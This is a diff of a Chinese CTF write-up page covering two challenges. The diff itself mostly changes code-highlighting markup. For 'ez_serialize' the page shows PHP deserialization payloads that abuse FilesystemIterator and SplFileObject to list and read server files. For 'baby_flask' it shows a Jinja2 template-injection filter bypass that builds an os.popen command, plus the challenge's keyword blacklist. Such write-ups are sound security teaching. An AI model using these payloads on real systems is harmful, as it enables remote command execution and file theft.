@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,7 +254,7 @@
             
             <div class="markdown-body">
               <h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>利用原生类，扫描，读取文件        </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
 
@@ -298,9 +306,9 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <span class="hljs-keyword">else</span>&#123;
     $a=<span class="hljs-keyword">new</span> A;
 
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <p>初看平平无奇，也没啥危险函数，利用原生类了       </p>
-<div class="hljs"><pre><code>    public function __wakeup()
+<pre><code>    public function __wakeup()
     &#123;
         $this-&gt;check = new C;
         if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;
@@ -308,9 +316,9 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
         &#125;
         else
             die(&#39;bad hacker~&#39;);
-    &#125;        </code></pre></div>
+    &#125;        </code></pre>
 <p><img src="https://sc02.alicdn.com/kf/U9a1978f1ecdb43efb14e616b95cca88eP.jpg" srcset="/img/loading.gif" alt="01.png">        </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
     <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;FilesystemIterator&#x27;</span>;
     <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>;
@@ -319,9 +327,9 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 $a=<span class="hljs-keyword">new</span> A();
 <span class="hljs-keyword">echo</span> serialize($a);
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>得到一个文件夹，然后再遍历这个文件夹，得到一个<code>flag.php</code><br>(这里用Diretorylterator的话，我在本地返回的是一个点）<br>读取文件       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
     <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;
     <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;
@@ -330,18 +338,18 @@ $a=<span class="hljs-keyword">new</span> A();
 
 $o  = <span class="hljs-keyword">new</span> A();
 <span class="hljs-keyword">echo</span> serialize($o);
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><p>过滤的东西        </p>
-<div class="hljs"><pre><code>blacklist&lt;/br&gt;   
+<pre><code>blacklist&lt;/br&gt;   
 &#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
 &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
 &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
 &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
 &#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;    
-&lt;/br&gt;</code></pre></div>
+&lt;/br&gt;</code></pre>
 <p>join拼接      </p>
 <p><code>&#123;&#123;[1,2,3]|join()&#125;&#125;</code>—–&gt; <code>123</code><br><code>&#123;&#123;[1,2,3]|join('|')&#125;&#125;</code>—–&gt;<code>1|2|3</code></p>
-<div class="hljs"><pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
+<pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
 &#123;%set b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _
 &#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals
 &#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem
@@ -355,7 +363,7 @@ $o  = <span class="hljs-keyword">new</span> A();
 &#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask
 &#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;
 #最后拼接起来
-#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;       </code></pre></div>
+#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;       </code></pre>
 <p><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">MORE1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">MORE2</a></p>
 
             </div>
@@ -501,6 +509,8 @@ $o  = <span class="hljs-keyword">new</span> A();
 
 
 
+  
+    
   
 
 
